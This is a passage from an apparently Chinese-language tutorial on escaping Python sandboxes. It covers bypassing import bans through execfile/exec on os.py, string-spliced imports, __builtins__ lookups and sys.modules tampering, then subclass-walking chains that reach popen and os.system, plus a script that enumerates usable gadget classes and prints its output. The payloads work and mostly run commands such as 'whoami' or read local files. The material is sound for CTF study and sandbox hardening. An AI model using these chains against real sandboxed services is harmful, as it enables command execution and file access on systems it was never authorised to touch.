Exception</code></pre><p>这样的话，不管怎么换导入函数都会被禁止。那么是否有不直接使用import关键字来导入的方式。既然需要导入也就是只需要能执行对应的库就可以。</p><p>使用execfile，不过在这之前需要判断得到库的物理路径。如果sys模块没被禁用的话，就可以使用sys来获取物理路径。这种方式只能用在python2中，python3取消了execfile</p><pre><code>&gt;&gt;&gt; execfile(&#39;/usr/lib/python2.7/os.py&#39;)  #Linux系统下默认路径&gt;&gt;&gt; system(&#39;whoami&#39;)misaki</code></pre><p>python3可以利用读取文件，配合exec来执行</p><pre><code>&gt;&gt;&gt; f = open(r&#39;/usr/lib/python3.6/os.py&#39;,&#39;r&#39;)&gt;&gt;&gt; exec(f.read())&gt;&gt;&gt; system(&#39;whoami&#39;)misaki#不可以执行利用exec打开读取，exec需要执行的是其中的内容，直接打开的时候exec执行的就是读取文件操作exec(&quot;open(&#39;/usr/lib/python3.6/os.py&#39;,&#39;r&#39;).read()&quot;)</code></pre><p>使用with open的形式</p><pre><code>&gt;&gt;&gt; with open(&#39;/usr/lib/python3.6/os.py&#39;,&#39;r&#39;) as f:...     exec(f.read())...&gt;&gt;&gt; system(&#39;whoami&#39;)misaki</code></pre><p>或者使用字符串拼接的方式，但是需要跟exec，eval一起利用。</p><pre><code>&gt;&gt;&gt; exec(&#39;imp&#39;+&#39;ort&#39;+&#39; &#39;+&#39;os;&#39;+&#39;os.system(&quot;whoami&quot;)&#39;)misaki\user</code></pre><p>这里exec不需要导入就可以直接引用，当然不需要导入就可以引用的函数不止这一个，因为一个内建函数的原因。</p><h3 id="builtins"><a href="#builtins" class="headerlink" title="__builtins__"></a>__builtins__</h3><p>__builtins__即时引用，在程序还为执行代码的时候就已经加载进来了。此模块并不需要导入，可以在任何模块中执行引用。比如在python2中</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150423.png" alt="image-20200421095142948"></p><p>在python3中</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150425.png" alt="image-20200421095205061"></p><p>所以我们通过dict属性来调用这些函数，例如如下调用exec来执行其中的python语句。</p><pre><code>&gt;&gt;&gt; __builtins__.__dict__[&#39;exec&#39;](&quot;print(&#39;ok&#39;)&quot;)ok</code></pre><p>通过内建函数来导入包</p><pre><code>&gt;&gt;&gt; __builtins__.__dict__[&#39;__import__&#39;](&#39;os&#39;).system(&#39;whoami&#39;)misaki\user</code></pre><p>万一跟上面一样，禁用了import，当然还可以使用拼接的方式</p><pre><code>&gt;&gt;&gt; __builtins__.__dict__[&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).system(&#39;whoami&#39;)misaki\user</code></pre><p>如果在__builtins__中，部分需要引用的函数被删除。不能直接用dict属性来调用，可以使用reload来重新加载</p><pre><code>reload(__builtin__)</code></pre><p>如果仔细看上面的图片就可以看到，在python2中reload也是__builtin__的内建函数。如果此函数被删除在python2中也不可以直接引用了。python3中reload不再是内建函数，3.4之前是imp模块下的函数，而之后是importlib模块下的函数。</p><p>所以可以直接利用imp模块来导入，python2也可以利用。</p><pre><code>&gt;&gt;&gt; import imp&gt;&gt;&gt; imp.reload(__builtins__)&lt;module &#39;__builtin__&#39; (built-in)&gt;</code></pre><p>在所上的导入模块中，系统的包都在一个默认路径下，被sys的modules存储记录。如果把其中的os模块删除就不能再去加载os模块了，这时候需要手动把os重新加载进去。一般尝试默认路径，或者sys查看存储路径</p><pre><code>&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.modules[&#39;os&#39;]=&#39;/usr/lib/python3.6/os.py&#39;&gt;&gt;&gt; import os&gt;&gt;&gt;</code></pre><h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><p>python沙箱逃逸还是离不开继承关系和子父类关系，在查看和使用类的继承，魔法函数起到了不可比拟的作用。</p><p>先看看几个常用的魔法函数</p><pre><code>__class__返回调用的类型class A():    passa = A()print(a.__class__)  #&lt;class &#39;__main__.A&#39;&gt;</code></pre><pre><code>__mro__查看类继承的所有父类，直到objectclass A:    passclass B(A):    passclass C(A):    passclass D(B, C):    passprint(D.__mro__) #(&lt;class &#39;__main__.D&#39;&gt;, &lt;class &#39;__main__.B&#39;&gt;, &lt;class &#39;__main__.C&#39;&gt;, &lt;class &#39;__main__.A&#39;&gt;, &lt;class &#39;object&#39;&gt;)</code></pre><pre><code>__subclasses__获取类的所有子类class A(object):    passclass B(A):    passclass C(A):    passprint(A.__subclasses__()) #[&lt;class &#39;__main__.B&#39;&gt;, &lt;class &#39;__main__.C&#39;&gt;]</code></pre><pre><code>__bases__返回所有直接父类组成的元组class A(object):    passclass B(A):    passprint(B.__bases__)  #(&lt;class &#39;__main__.A&#39;&gt;,)  不返回object类</code></pre><pre><code>__init__类实例创建之后调用, 对当前对象的实例的一些初始化class A:    def __init__(self):        print(&#39;ok&#39;)a = A()  # 输出ok</code></pre><pre><code>__globals__能够返回函数所在模块命名空间的所有变量class A(object):    def __init__(self, a, b):        self.a = a        self.b = ba.__init__.__globals__{&#39;A&#39;: &lt;class &#39;__main__.A&#39;&gt;, &#39;a&#39;: &lt;__main__.A object at 0x0000000001692390&gt;, &#39;importlib&#39;: &lt;module &#39;importlib&#39; from &#39;D:\anaconda\lib\importlib\__init__.pyc&#39;&gt;, &#39;__builtins__&#39;: &lt;module &#39;__builtin__&#39; (built-in)&gt;, &#39;pattern&#39;: &lt;_sre.SRE_Pattern object at 0x0000000001695030&gt;, &#39;base64&#39;: &lt;module &#39;base64&#39; from &#39;D:\anaconda\lib\base64.pyc&#39;&gt;, &#39;sys&#39;: &lt;module &#39;sys&#39; (built-in)&gt;, &#39;flag&#39;: &lt;module &#39;os&#39; from &#39;D:\anaconda\lib\os.pyc&#39;&gt;, &#39;__package__&#39;: None, &#39;os&#39;: &lt;module &#39;os&#39; from &#39;D:\anaconda\lib\os.pyc&#39;&gt;, &#39;__doc__&#39;: None, &#39;match&#39;: &lt;_sre.SRE_Match object at 0x00000000039A9B28&gt;}</code></pre><pre><code>__getattribute__当类被调用的时候，无条件进入此函数。__getattr__对象中不存在的属性时调用class A:    def __init__(self):        self.name = &quot;Bob&quot;    def __getattribute__(self,item):        print(&quot;ok&quot;)a = A()  a.name   #ok, 这时候不管调用什么属性都会返回ok，相当于拦截了属性调用。    def __getattr__(self):        print(&#39;getattr&#39;)a.age   #getattr  调用不存在的属性会执行，相当于处理了AttributeError。</code></pre><h3 id="类继承使用"><a href="#类继承使用" class="headerlink" title="类继承使用"></a>类继承使用</h3><p>尝试利用继承关系来找到object类</p><pre><code>&quot;&quot;.__class__.__bases__   #(&lt;class &#39;object&#39;&gt;,)</code></pre><p>前面不仅可以使用双引号，还可以利用列表或者字典类型，区别在查找类型的时候在不同的基础上查找，返回都是元组。</p><pre><code>[].__class__.__bases__{}.__class__.__bases__</code></pre><p>在object类下去查找所有的子类，然后去查找可利用类，__bases__返回是元组，使用下标获得object类。</p><pre><code>&quot;&quot;.__class__.__bases__[0].__subclasses__()</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150429.png" alt="image-20200421145832381"></p><p>找到需要使用的类，其中有可以使用的类，在python3中使用</p><pre><code>&lt;class &#39;os._wrap_close&#39;&gt;,&lt;class &#39;warnings.WarningMessage&#39;&gt;</code></pre><p>调用他们</p><pre><code>&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[128]&lt;class &#39;os._wrap_close&#39;&gt;&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[177]&lt;class &#39;warnings.WarningMessage&#39;&gt;</code></pre><p>如果子类过多，不好查找是第几个下标，可以使用如下来标记</p><pre><code>for i in enumerate(&quot;&quot;.__class__.__bases__[0].__subclasses__()):     print i</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150432.png" alt="image-20200421150812786"></p><p>先来读取一下文件，C盘下的win.ini文件</p><pre><code>&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150434.png" alt="image-20200421162023248"></p><p>从中查找是否有关于文件读取的方法，比如open，file函数。在最后找到一个popen函数。</p><pre><code>&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&quot;C:\\windows\\win.ini&quot;).read()</code></pre><p>如果想直接在终端显示出来</p><pre><code>&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&quot;type C:\\windows\\win.ini&quot;).read()</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150436.png" alt="image-20200423141850480"></p><p>在python2中可以使用如下形式读取文件的第一行，在python2中前面是否字符串还是元组或者字典对后面类的查找有不一样的结果。</p><pre><code>().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].getline(&quot;C:\\windows\\win.ini&quot;,1)</code></pre><p>执行命令</p><pre><code>&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].os.system(&#39;whoami&#39;)misaki\user</code></pre><p>但是python2如果使用字符串的形式，会报如下错误，因为<code>__bases__</code>获取的并不是object类</p><pre><code>&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[59]Traceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;IndexError: list index out of range</code></pre><p>只需要再去获得一次即可</p><pre><code>&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__bases__[0].__subclasses__()[59]&lt;class &#39;warnings.WarningMessage&#39;&gt;</code></pre><h2 id="特殊函数查找"><a href="#特殊函数查找" class="headerlink" title="特殊函数查找"></a>特殊函数查找</h2><h3 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h3><p>在GitHub的python页面上把自带函数全部获取目前的3.8的模块(202)</p><pre><code>asynciocollectionsconcurrentctypescursesdbmdistutilsemailencodings......warnings.pywave.pyweakref.pywebbrowser.pyxdrlib.pyzipapp.pyzipfile.pyzipimport.py</code></pre><p>将这么模块进行筛选，规则这些模块哪些有调用上面提到的模块，或者文件读取等方法。</p><pre><code># coding=UTF-8import codecsfrom collections import defaultdictwith codecs.open(&#39;python.txt&#39;, &#39;r&#39;, encoding=&#39;UTF-8&#39;) as f:    modules = f.readlines()modules = [m.strip().replace(&#39;.py&#39;, &#39;&#39;) for m in modules]target_modules = [&#39;os&#39;, &#39;platform&#39;, &#39;subprocess&#39;, &#39;timeit&#39;, &#39;importlib&#39;, &#39;codecs&#39;, &#39;sys&#39;, &#39;commands&#39;]target_functions = [&#39;__import__&#39;, &#39;__builtins__&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;file&#39;, &#39;open&#39;, &#39;codecs&#39;]all_targets = target_modules + target_functionsresults = defaultdict(list)for m in modules:    try:        module = __import__(m)    except Exception as e:        # print(&#39;ERROR:&#39;, m)        pass    for t in all_targets:        if t in module.__dict__:            results[m.encode()].append(t)print(&quot;可利用模块数量为:&quot;+str(len(results)))for k, v in results.items():    print(k, v)</code></pre><p>筛选完成后有python3两百个模块可能可以利用，然后再利用脚本进一步筛选</p><pre><code>find_modules = {    }target_modules = [&#39;os&#39;, &#39;platform&#39;, &#39;subprocess&#39;, &#39;timeit&#39;, &#39;importlib&#39;, &#39;codecs&#39;, &#39;sys&#39;]target_functions = [&#39;__import__&#39;, &#39;__builtins__&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;file&#39;, &#39;open&#39;]all_targets = list(set(list(find_modules.keys()) + target_modules + target_functions))all_modules = list(set(list(find_modules.keys()) + target_modules))subclasses = ().__class__.__bases__[0].__subclasses__()sub_name = [s.__name__ for s in subclasses]# 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40](&#39;./test.py&#39;).read()print(&#39;----------1-----------&#39;)for i, s in enumerate(sub_name):    for f in all_targets:        if f == s:            if f in target_functions:                print(i, f)            elif f in all_modules:                target = find_modules[f]                sub_dict = subclasses[i].__dict__                for t in target:                    if t in sub_dict:                        print(i, f, target)print(&#39;----------2-----------&#39;)# 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;ls&#39;)for i, sub in enumerate(subclasses):    try:        more = sub.__init__.__globals__        for m in all_targets:            if m in more:                print(i, sub, m, find_modules.get(m))    except Exception as e:        passprint(&#39;----------3-----------&#39;)# 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)for i, sub in enumerate(subclasses):    try:        more = sub.__init__.__globals__.values()        for j, v in enumerate(more):            for f in all_targets:                try:                    if f in v:                        if f in target_functions:                            print(i, j, sub, f)                        elif f in all_modules:                            target = find_modules.get(f)                            sub_dict = v[f].__dict__                            for t in target:                                if t in sub_dict:                                    print(i, j, sub, f, target)                except Exception as e:                    pass    except Exception as e:        passprint(&#39;----------4-----------&#39;)# 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[&#39;__import__&#39;](&quot;os&quot;).system(&quot;ls&quot;)# &lt;class &#39;warnings.catch_warnings&#39;&gt;类很特殊，在内部定义了_module=sys.modules[&#39;warnings&#39;]，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似for i, sub in enumerate(subclasses):    try:        more = sub()._module.__builtins__        for f in all_targets:            if f in more:                print(i, f)    except Exception as e:        pass</code></pre><pre><code>----------2-----------75 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; __builtins__ None75 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; __import__ None75 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; sys None76 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; __builtins__ None76 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; __import__ None76 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; sys None77 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; __builtins__ None77 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; __import__ None77 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; sys None78 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; __builtins__ None78 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; __import__ None78 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; sys None79 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; __builtins__ None79 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; __import__ None79 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; sys None91 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; __builtins__ None91 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; sys None92 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; __builtins__ None92 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; sys None93 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; __builtins__ None93 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; sys None95 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; __builtins__ None95 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; sys None103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; __builtins__ None103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; sys None103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open None104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; __builtins__ None104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; sys None104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open None105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; __builtins__ None105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; sys None105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open None106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; __builtins__ None106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; sys None106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open None128 &lt;class &#39;os._wrap_close&#39;&gt; __builtins__ None128 &lt;class &#39;os._wrap_close&#39;&gt; sys None128 &lt;class &#39;os._wrap_close&#39;&gt; open None129 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; __builtins__ None129 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; sys None130 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; __builtins__ None130 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; sys None137 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; __builtins__ None138 &lt;class &#39;types._GeneratorWrapper&#39;&gt; __builtins__ None139 &lt;class &#39;warnings.WarningMessage&#39;&gt; __builtins__ None139 &lt;class &#39;warnings.WarningMessage&#39;&gt; sys None140 &lt;class &#39;warnings.catch_warnings&#39;&gt; __builtins__ None140 &lt;class &#39;warnings.catch_warnings&#39;&gt; sys None167 &lt;class &#39;reprlib.Repr&#39;&gt; __builtins__ None174 &lt;class &#39;functools.partialmethod&#39;&gt; __builtins__ None176 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; __builtins__ None176 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; sys None177 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; __builtins__ None177 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; sys None----------3-----------75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; exec75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; eval75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; compile75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; __import__75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; open76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; exec76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; eval76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; compile76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; __import__76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; open77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; exec77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; eval77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; compile77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; __import__77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; open78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; exec78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; eval78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; compile78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; __import__78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; open79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; exec79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; eval79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; compile79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; __import__79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; open91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; exec91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; eval91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; compile91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; __import__91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; open92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; exec92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; eval92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; compile92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; __import__92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; open93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; exec93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; eval93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; compile93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; __import__93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; open95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; exec95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; eval95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; compile95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; __import__95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; open103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; exec103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; eval103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; compile103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; __import__103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open103 56 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; exec104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; eval104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; compile104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; __import__104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open104 56 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; exec105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; eval105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; compile105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; __import__105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open105 56 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; exec106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; eval106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; compile106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; __import__106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open106 56 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open128 1 &lt;class &#39;os._wrap_close&#39;&gt; exec128 1 &lt;class &#39;os._wrap_close&#39;&gt; file128 1 &lt;class &#39;os._wrap_close&#39;&gt; open128 7 &lt;class &#39;os._wrap_close&#39;&gt; exec128 7 &lt;class &#39;os._wrap_close&#39;&gt; eval128 7 &lt;class &#39;os._wrap_close&#39;&gt; compile128 7 &lt;class &#39;os._wrap_close&#39;&gt; __import__128 7 &lt;class &#39;os._wrap_close&#39;&gt; open128 11 &lt;class &#39;os._wrap_close&#39;&gt; open129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; exec129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; eval129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; compile129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; __import__129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; open130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; exec130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; eval130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; compile130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; __import__130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; open137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; exec137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; eval137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; compile137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; __import__137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; open138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; exec138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; eval138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; compile138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; __import__138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; open139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; exec139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; eval139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; compile139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; __import__139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; open140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; exec140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; eval140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; compile140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; __import__140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; open167 7 &lt;class &#39;reprlib.Repr&#39;&gt; exec167 7 &lt;class &#39;reprlib.Repr&#39;&gt; eval167 7 &lt;class &#39;reprlib.Repr&#39;&gt; compile167 7 &lt;class &#39;reprlib.Repr&#39;&gt; __import__167 7 &lt;class &#39;reprlib.Repr&#39;&gt; open174 7 &lt;class &#39;functools.partialmethod&#39;&gt; exec174 7 &lt;class &#39;functools.partialmethod&#39;&gt; eval174 7 &lt;class &#39;functools.partialmethod&#39;&gt; compile174 7 &lt;class &#39;functools.partialmethod&#39;&gt; __import__174 7 &lt;class &#39;functools.partialmethod&#39;&gt; open176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; exec176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; eval176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; compile176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; __import__176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; open177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; exec177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; eval177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; compile177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; __import__177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; open----------4-----------140 exec140 eval140 compile140 __import__140 open</code></pre><p>筛选出来的模块还是很多，每个分块中，不用的部分代表利用不同的方式，为了更方便的利用进一步筛选具有更直接利用方式的类，关注再命令执行和读写上</p><pre><code>----------2-----------                                      103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open None           104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open None           105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open None           106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open None                128 &lt;class &#39;os._wrap_close&#39;&gt; open None                      ----------3-----------                                      75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; open           75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; exec           76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; open      76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; exec      77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; open    77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; exec    78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; open     78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; exec     79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; open            79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; exec            91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; open   91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; exec   92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; open92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; exec93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; open93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; exec95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; open   95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; exec   103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open              103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; exec              103 56 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open             104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open              104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; exec              104 56 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open             105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open              105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; exec              105 56 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open             106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open                   106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; exec                   106 